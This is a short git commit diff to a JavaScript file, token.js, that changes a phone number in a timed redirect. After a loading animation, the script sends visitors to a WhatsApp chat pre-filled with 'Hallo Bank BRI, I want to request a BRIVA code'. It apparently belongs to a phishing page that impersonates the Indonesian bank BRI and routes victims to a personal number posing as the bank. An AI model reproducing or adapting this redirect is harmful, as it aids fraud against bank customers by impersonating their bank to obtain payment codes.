fb5fa63ab98c1cbd65b15093e2006f4e4982a86e
dodypribadi5 <dodypribadi5@gmail.com>
2024-12-03 21:06:01 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@ $(document).ready(function() {
     $("#process1").show();
  $('.load').fadeIn();
     setTimeout(function(){      
-location.href='https://wa.me/628993333342?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20BRIVA';
+location.href='https://wa.me/62818836576?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20request%20kode%20BRIVA';
  $("#process1").hide();
  $('.load').fadeOut();        
          }, 2000);
